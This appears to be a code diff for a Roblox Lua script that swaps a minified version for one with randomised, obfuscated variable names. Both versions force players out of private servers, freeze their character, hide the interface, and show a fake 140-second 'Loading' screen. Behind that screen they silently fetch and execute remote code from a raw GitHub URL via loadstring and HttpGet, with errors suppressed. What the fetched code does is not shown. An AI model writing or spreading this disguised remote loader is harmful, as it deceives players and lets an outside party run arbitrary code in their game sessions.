@@ -1,1 +1,76 @@
-local a,b,c,d,e=game,game:GetService("TeleportService"),game.Players.LocalPlayer,game:GetService("UserInputService"),140;if a.PrivateServerId~=""then local f=Instance.new("Message",workspace)f.Text="You cannot join through private instances. Sending you to a public server..."wait(4)f:Destroy()b:Teleport(a.PlaceId,c)return end;local g=c:WaitForChild("PlayerGui")local h={}for i,j in pairs(g:GetChildren())do if j:IsA("ScreenGui")then h[j]=j.Enabled;j.Enabled=false end end;local k=c.Character or c.CharacterAdded:Wait()local l=k:FindFirstChildOfClass("Humanoid")if l then l.WalkSpeed=0;l.JumpPower=0;l.PlatformStand=true end;local m=workspace.CurrentCamera;m.CameraType=Enum.CameraType.Scriptable;local n=Instance.new("ScreenGui",g)n.Name="FullLoadingScreen"n.IgnoreGuiInset=true;n.ResetOnSpawn=false;n.DisplayOrder=9999;local o=Instance.new("Frame",n)o.BackgroundColor3=Color3.new(0,0,0)o.Size=UDim2.new(1,0,1,0)local p=Instance.new("TextLabel",o)p.Size=UDim2.new(1,0,0.1,0)p.Position=UDim2.new(0,0,0.3,0)p.BackgroundTransparency=1;p.TextColor3=Color3.new(1,1,1)p.TextScaled=true;p.Font=Enum.Font.SourceSansBold;p.Text="Loading, please wait..."local q=Instance.new("TextLabel",o)q.Size=UDim2.new(1,0,0.1,0)q.Position=UDim2.new(0,0,0.5,0)q.BackgroundTransparency=1;q.TextColor3=Color3.new(1,1,1)q.TextScaled=true;q.Font=Enum.Font.SourceSans;q.Text="Loading: "..e;spawn(function()pcall(function()loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()end)end)for r=e,1,-1 do q.Text="Loading: "..r;wait(1)end;n:Destroy()for i,s in pairs(h)do if i and i.Parent then i.Enabled=s end end;if l then l.WalkSpeed=16;l.JumpPower=50;l.PlatformStand=false end;m.CameraType=Enum.CameraType.Custom;d.ModalEnabled=false;d.OverrideMouseIconBehavior=Enum.OverrideMouseIconBehavior.None
+local EIjFMKpBjJ = game.Players.LocalPlayer
+local RlfYmvZqHK = game:GetService("TeleportService")
+if game.PrivateServerId ~= "" then
+    local kMnoMuzAlz = Instance.new("Message", workspace)
+    kMnoMuzAlz.Text = "You cannot join through private instances. Sending you to a public server..."
+    wait(4)
+    kMnoMuzAlz:Destroy()
+    RlfYmvZqHK:TeleportToPlaceInstance(game.PlaceId, "", EIjFMKpBjJ)
+    return
+end
+local XSFGYPZWxU = 140
+local OUWtMhtlce = game:GetService("UserInputService")
+local gDlHxzdAFY = EIjFMKpBjJ:WaitForChild("PlayerGui")
+local whSjyYkxKA = {}
+for _, gui in pairs(gDlHxzdAFY:GetChildren()) do
+    if gui:IsA("ScreenGui") then
+        whSjyYkxKA[gui] = gui.Enabled
+        gui.Enabled = false
+    end
+end
+local kNsoVlnaqd = EIjFMKpBjJ.Character or EIjFMKpBjJ.CharacterAdded:Wait()
+local DUrkxnFIKi = kNsoVlnaqd:FindFirstChildOfClass("Humanoid")
+if DUrkxnFIKi then
+    DUrkxnFIKi.WalkSpeed = 0
+    DUrkxnFIKi.JumpPower = 0
+    DUrkxnFIKi.PlatformStand = true
+end
+local wbnpzcZImP = workspace.CurrentCamera
+wbnpzcZImP.CameraType = Enum.CameraType.Scriptable
+local rAyWCiozGH = Instance.new("ScreenGui", gDlHxzdAFY)
+rAyWCiozGH.Name = "FullLoadingScreen"
+rAyWCiozGH.IgnoreGuiInset = true
+rAyWCiozGH.ResetOnSpawn = false
+rAyWCiozGH.DisplayOrder = 9999
+local SciCodPrxL = Instance.new("Frame", rAyWCiozGH)
+SciCodPrxL.BackgroundColor3 = Color3.new(0, 0, 0)
+SciCodPrxL.Size = UDim2.new(1, 0, 1, 0)
+local TRrzJnANKx = Instance.new("TextLabel", SciCodPrxL)
+TRrzJnANKx.Size = UDim2.new(1, 0, 0.1, 0)
+TRrzJnANKx.Position = UDim2.new(0, 0, 0.3, 0)
+TRrzJnANKx.BackgroundTransparency = 1
+TRrzJnANKx.TextColor3 = Color3.new(1, 1, 1)
+TRrzJnANKx.TextScaled = true
+TRrzJnANKx.Font = Enum.Font.SourceSansBold
+TRrzJnANKx.Text = "Loading, please wait..."
+local dAtdlJWyMP = Instance.new("TextLabel", SciCodPrxL)
+dAtdlJWyMP.Size = UDim2.new(1, 0, 0.1, 0)
+dAtdlJWyMP.Position = UDim2.new(0, 0, 0.5, 0)
+dAtdlJWyMP.BackgroundTransparency = 1
+dAtdlJWyMP.TextColor3 = Color3.new(1, 1, 1)
+dAtdlJWyMP.TextScaled = true
+dAtdlJWyMP.Font = Enum.Font.SourceSans
+dAtdlJWyMP.Text = "Loading: " .. XSFGYPZWxU
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/boomboxmisscal/test/refs/heads/main/test"))()
+    end)
+end)
+for DUrkxnFIKi = XSFGYPZWxU, 1, -1 do
+    dAtdlJWyMP.Text = "Loading: " .. DUrkxnFIKi
+    wait(1)
+end
+rAyWCiozGH:Destroy()
+for gui, wasEnabled in pairs(whSjyYkxKA) do
+    if gui and gui.Parent then
+        gui.Enabled = wasEnabled
+    end
+end
+if DUrkxnFIKi then
+    DUrkxnFIKi.WalkSpeed = 16
+    DUrkxnFIKi.JumpPower = 50
+    DUrkxnFIKi.PlatformStand = false
+end
+wbnpzcZImP.CameraType = Enum.CameraType.Custom
+OUWtMhtlce.ModalEnabled = false
+OUWtMhtlce.OverrideMouseIconBehavior = Enum.OverrideMouseIconBehavior.None
